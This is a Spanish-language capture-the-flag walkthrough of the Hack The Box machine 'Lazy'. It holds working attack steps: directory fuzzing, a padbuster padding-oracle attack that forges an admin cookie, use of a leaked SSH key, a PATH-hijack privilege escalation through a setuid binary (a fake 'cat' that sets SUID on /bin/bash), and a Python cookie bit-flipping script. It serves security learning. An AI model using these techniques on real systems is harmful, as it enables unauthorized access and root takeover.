# 10.10.10.18 - Lazy
--------------------

Puertos abiertos 22, 80

```console
Apache[2.4.7], Bootstrap, PHP[5.5.9-1ubuntu4.21], Title[CompanyDev], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```

```console
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.18/FUZZ.php

000000001:   200        41 L     77 W       1117 Ch     "index"
000000051:   200        60 L     95 W       1592 Ch     "register"
000000039:   200        58 L     97 W       1548 Ch     "login"
000000319:   200        7 L      4 W        51 Ch       "footer"
000001211:   302        22 L     41 W       734 Ch      "logout"
000000177:   200        22 L     41 W       734 Ch      "header"
000045226:   403        10 L     30 W       282 Ch      "http://10.10.10.18/.php"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.18/FUZZ/
000000002:   200        18 L     79 W       1347 Ch     "images"
000000536:   200        17 L     70 W       1143 Ch     "css"
000001414:   200        19 L     92 W       1529 Ch     "classes"
000000069:   403        10 L     30 W       284 Ch      "icons"
```

Nos encontramos con una web cutre que parece sacada de los 90s.
Si me registro como cucuxii:cucuxii sale mi nombre. Pero al no ser python poco sentido tiene un STTI.
Si pongo admin:admin sale invalid credentials asi que no hay manera de enumerar esto.

En /classes sale un directory listing de "auth.php, db.php, phpfix.php, user.php"

# Padding oracle attack

La cookie que nos identifica es "auth = YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn"
```php
print(base64_decode(urldecode("YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn")));
# bytes sin sentido, pero sabemos que %2B es "+"
```
```console
└─$ curl -s http://10.10.10.18/index.php -b 'auth=YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn';
# Te has logueado como cucuxii
└─$ curl -s http://10.10.10.18/index.php -b "auth=YBReycmID4kNzNqibgzqJoq%2B"
#Invalid padding 
```
Esto confirma que está encriptado con CBC o cofrado por bloques.
Padbuster sirve para densencriptar cookies de este tipo (suele requerir tamaño de bloque de 8 bytes)
```console
└─$ padbuster http://10.10.10.18/index.php 'YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn' 8 -cookies 'auth=YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn'
*** Response Analysis Complete ***
1	1	200	1133	N/A
2 **	255	200	15	N/A
NOTE: The ID# marked with ** is recommended :2
(...)
[+] Decrypted value (ASCII): user=cucuxii
[+] Decrypted value (HEX): 757365723D6375637578696904040404
[+] Decrypted value (Base64): dXNlcj1jdWN1eGlpBAQEBA==
...
```
Ha sacado user=cucuxii
```console
└─$ padbuster http://10.10.10.18/index.php 'YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn' 8 -cookies 'auth=YBReycmID4kNzNqibgzqJoq%2BzD9LLtzn' -plaintext 'user=admin'
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe
BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
```

```console
└─$ curl -s http://10.10.10.18/index.php -b 'auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA';
You are currently logged in as admin!
```
Si cambiamos la cookie por esta nueva entramos. Nos dan un enlace donde comparten una clave privada

```console
└─$ curl -s http://10.10.10.18/mysshkeywithnamemitsos > id_rsa
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa  mitsos@10.10.10.18
mitsos@LazyClown:~$
```

```console
mitsos@LazyClown:~$ ls
backup  cat  peda  user.txt
mitsos@LazyClown:~$ ls -l 
-rwsrwsr-x 1 root   root   7303 May  3  2017 backup
-rw-rw-r-- 1 mitsos mitsos    0 Dec  7  2021 cat
drwxrwxr-x 4 mitsos mitsos 4096 Dec  7  2021 peda
-r--r--r-- 1 mitsos mitsos   33 Jan 13 12:45 user.txt
-rwsrwsr-x 1 root   root   7303 May  3  2017 backup
mitsos@LazyClown:~$ ./backup
# Printea una copia del /etc/passwd

mitsos@LazyClown:~$ ltrace ./backup
__libc_start_main(0x804841d, 1, 0xbffffce4, 0x8048440 <unfinished ...>
system("cat /etc/shadow"cat: /etc/shadow: Permission denied
# El ltrace ejecuta el binario con bajos privilegios asi que no muestra el archivo este, pero si nos dice
# que se ha hecho system("cat /etc/shadow")

mitsos@LazyClown:~$ strings backup | grep "cat"
cat /etc/shadow
# Confirmamos
```

El problema reside en llamar a cat por su ruta relativa en vez de absoluta (/bin/cat) esp se traduce en que el 
sistema buscar este binario en una serie de rutas ordenadas por prioridad:
```console
mitsos@LazyClown:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
mitsos@LazyClown:~$ which cat
/bin/cat # /usr/bin/cat
```

Si existiera un cat malicioso en una ruta anterior a sbin como "/usr/local/sbin" el sistema lo ejecutaria como
prioritario.
Como no creo que tengamos acceso a ninguna de esas rutas podemos editar el path para añadir otra como primer 
orden de prioridad...

```console
mitsos@LazyClown:~$ pwd
/home/mitsos
mitsos@LazyClown:~$ export PATH=/home/mitsos:$PATH
mitsos@LazyClown:~$ echo $PATH
/home/mitsos:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Creamos en el directorio actual un archivo llamado **cat** 
```console
mitsos@LazyClown:~$ echo "chmod u+s /bin/bash" > ./cat
mitsos@LazyClown:~$ chmod +x cat
mitsos@LazyClown:~$ ./backup
mitsos@LazyClown:/tmp$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# cat root.txt
chmod: changing permissions of ‘/bin/bash’: Operation not permitted
```
No nos deja porque ahora cat es el malo, tenemos que recuperar un cat bueno
```console
bash-4.3# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
bash-4.3# cat /root/root.txt
```

-------------

# Extra: Error en PHP

[Fuente](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html)
Si en registro ponemos admin:admin nos dice que 
```console
└─$ curl -s -POST http://10.10.10.18/register.php -d "username=admin&password=admin&password_again=admin" | html2text
# Can't create user: user exists
└─$ curl -s -POST http://10.10.10.18/register.php -d "username=admin%3D&password=admin%3D&password_again=admin%3D" | html2text 
# admin=:admin= -> Can't create user: user exists
```
En cambio si intentamos registrarnos como admin==:admin== si nos deja.

Esto tan extraño se produce por un error de php.
En /var/www/html/classes/user.php hay una funcion interesante:
```
public static function getuserfromcookie($auth) {
  $passphrase = 'pntstrlb';
  $data = decryptString($auth, $passphrase);
  list($a, $user) = explode("=", $data);
...
```
└─$ php --interactive
php > $data = "user=admin";
php > list($a, $user) = explode("=", $data);
php > echo($a . " - " . $user);
user - admin

php > $data = "user=admin=";
php > list($a, $user) = explode("=", $data);
php > echo($a . " - " . $user);
user - admin # Lo mismo
```
Digamos que al entrar como "admin=" o "admin==" se queda en "admin" devolviendonos la cookie "user=admin"

-----------------------

# Extra: BitFlip

Tambien hice un script para hacer un bit flipper attack (basado en el de [0xdf](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html))

Si nos registramos como bdmin sale la cookie "PkkvEZS4wDnUuWG1KxxQdUu3NFXTiDWI"
bdmin se parece mucho a admin asi que el algoritmo creará una cookie solo cambiando el byte correspondiente a 
la "b" por la "a" y dejando el resto igual (prueba con admin bdmin cdmin... hasta dar con el correcto)

```python
#!/usr/bin/python3
import base64
import requests

cookie_bin = base64.b64decode('PkkvEZS4wDnUuWG1KxxQdUu3NFXTiDWI') # La cookie de "bdmin"
for byte in range(len(cookie_bin)):			# Por cada byte de la cookie
    for block in range(8):					# Probamos a dividir en bloques hasta 8
		# Algoritmo de bit flipping ------------------------------
        mod_byte = cookie_bin[byte] ^ pow(2,block) # Por cada byte le hace un xor a 2 elevado al bloque
        mod_cookie_bin = cookie_bin[:byte] + bytes([mod_byte]) + cookie_bin[byte+1:] # Mas operatoria...
		# --------------------------------------------------------
        mod_cookie = base64.b64encode(mod_cookie_bin).decode() # esa cookie nueva la pone en base64
        resp = requests.get('http://10.10.10.18/index.php', cookies={'auth': mod_cookie}) # hace una peticion
        if 'admin' in resp.text:  # Si está admin se da por buena la respuesta
            print(f'Flip byte {byte}, xor by 0x{pow(2,block):02x} - Nueva Cookie: {mod_cookie}')
            exit()
```
```console
└─$ python3 bitflip.py
Flip byte 5, xor by 0x80 - Nueva cookie: PkkvEZQ4wDnUuWG1KxxQdUu3NFXTiDWI
# Es disinta a la del padbuster porque se han usado 5 bloques esta vez.
```

Por tanto sabemos que las cookie de admin y de bdmin solo se diferencian en el septimo caracter: "S" -> "Q"
```console
└─$ echo "PkkvEZS4wDnUuWG1KxxQdUu3NFXTiDWI" | base64 -d | xxd -ps   
3e492f1194b8c039d4b961b52b1c50754bb73455d3883588                                                                                                                      
└─$ echo "PkkvEZQ4wDnUuWG1KxxQdUu3NFXTiDWI" | base64 -d | xxd -ps   
3e492f119438c039d4b961b52b1c50754bb73455d3883588
```
Lo que hace la tecnica del bit flipping es cambiar un bit hasta que de con el bueno.

